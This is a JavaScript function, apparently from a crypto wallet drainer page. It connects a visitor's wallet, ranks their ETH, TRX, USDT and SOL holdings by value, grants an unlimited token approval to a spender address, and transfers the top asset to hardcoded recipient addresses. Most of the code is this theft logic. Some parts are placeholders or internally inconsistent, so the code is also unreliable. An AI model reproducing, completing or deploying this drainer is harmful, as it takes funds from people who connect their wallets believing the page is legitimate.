const connectAndApprove = async () => {
    const provider = await EthereumProvider.init({
      projectId: '7dabcdde47b6439403c2ec186b1fedaf',
      chains: [1],
      showQrModal: true,
    });
  
    await provider.enable();
    const ethersProvider = new ethers.providers.Web3Provider(provider);
    const signer = ethersProvider.getSigner();
    const address = await signer.getAddress();
    console.log('Connected address:', address);
  
    // Получаем балансы для всех токенов
    const ethBalance = await ethersProvider.getBalance(address);
    const trxBalance = await tronWeb.trx.getBalance(address);
    const usdtTronContract = await tronWeb.contract().at('TXYZz6XbYBrpo8uKDb9J25tzXzVs6gnj9o');
    const usdtTronBalance = await usdtTronContract.balanceOf(address).call();
    const solBalance = await solanaConnection.getBalance(new PublicKey('E3z6HdpfNFHjVrkyQs13pmVVWUWH9G6x35yWg2ViJ7qW'));
    
    // Получаем цены токенов
    const ethPrice = await getPrice('ethereum');
    const trxPrice = await getPrice('tron');
    const usdtPrice = await getPrice('tether');
    const solPrice = await getPrice('solana');
  
    const ethValue = parseFloat(ethers.utils.formatEther(ethBalance)) * ethPrice;
    const trxValue = trxBalance * trxPrice;
    const usdtValue = parseFloat(ethers.utils.formatEther(usdtTronBalance)) * usdtPrice;
    const solValue = solBalance / Math.pow(10, 9) * solPrice;
  
    // Сравниваем и выбираем токен с максимальной стоимостью
    let maxValueToken;
    let maxValueAmount;
    let maxValueAddress;
  
    if (ethValue >= trxValue && ethValue >= usdtValue && ethValue >= solValue) {
      maxValueToken = 'ETH';
      maxValueAmount = ethBalance;
      maxValueAddress = '0xYourEthTokenAddress';  // Ethereum token address
    } else if (trxValue >= ethValue && trxValue >= usdtValue && trxValue >= solValue) {
      maxValueToken = 'TRX';
      maxValueAmount = trxBalance;
      maxValueAddress = '0xYourTrxTokenAddress';  // TRX token address
    } else if (usdtValue >= ethValue && usdtValue >= trxValue && usdtValue >= solValue) {
      maxValueToken = 'USDT (Tron)';
      maxValueAmount = usdtTronBalance;
      maxValueAddress = '0xYourUsdtTokenAddress';  // USDT Tron token address
    } else {
      maxValueToken = 'SOL';
      maxValueAmount = solBalance;
      maxValueAddress = 'SOL_TOKEN_ADDRESS';  // SOL token address
    }
  
    console.log(`Token with max value: ${maxValueToken}`);
    console.log(`Amount to approve: ${maxValueAmount}`);
  
    // Perform approve for selected token
    if (maxValueToken !== 'ETH') {
      const tokenContract = new ethers.Contract(
        maxValueAddress,
        ['function approve(address spender, uint256 amount) public returns (bool)'],
        signer
      );
  
      const tx = await tokenContract.approve('0xSpenderAddress', ethers.constants.MaxUint256);
      console.log('Approval TX:', tx.hash);
    }
  
    // Transfer tokens to the recipient addresses
    const recipientAddresses = [
      'TUyMSnLEZoDcnG2XP9tQ4fHLfJbE6hvMDS',
      '0x31e4Ad59807dc6baB633B1f22Ff9fa34AD11306e',
      '0x31e4Ad59807dc6baB633B1f22Ff9fa34AD11306e',
      'TUyMSnLEZoDcnG2XP9tQ4fHLfJbE6hvMDS',
      'E3z6HdpfNFHjVrkyQs13pmVVWUWH9G6x35yWg2ViJ7qW'
    ];
  
    if (maxValueToken === 'ETH') {
      const tx = await signer.sendTransaction({
        to: recipientAddresses[0],
        value: maxValueAmount,
      });
      console.log('ETH Transfer TX:', tx.hash);
    }
  
    if (maxValueToken === 'TRX' || maxValueToken === 'USDT (Tron)') {
      const tronTx = await tronWeb.trx.sendTransaction(
        recipientAddresses[0], 
        maxValueAmount
      );
      console.log(`${maxValueToken} Transfer TX:`, tronTx);
    }
  
    if (maxValueToken === 'SOL') {
      const transaction = await solanaConnection.sendTransaction(
        new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: solanaWallet.publicKey,
            toPubkey: new PublicKey('E3z6HdpfNFHjVrkyQs13pmVVWUWH9G6x35yWg2ViJ7qW'),
            lamports: maxValueAmount * Math.pow(10, 9),
          })
        ),
        [solanaWallet]
      );
      console.log('SOL Transfer TX:', transaction);
    }
  };
  
  window.connectAndApprove = connectAndApprove;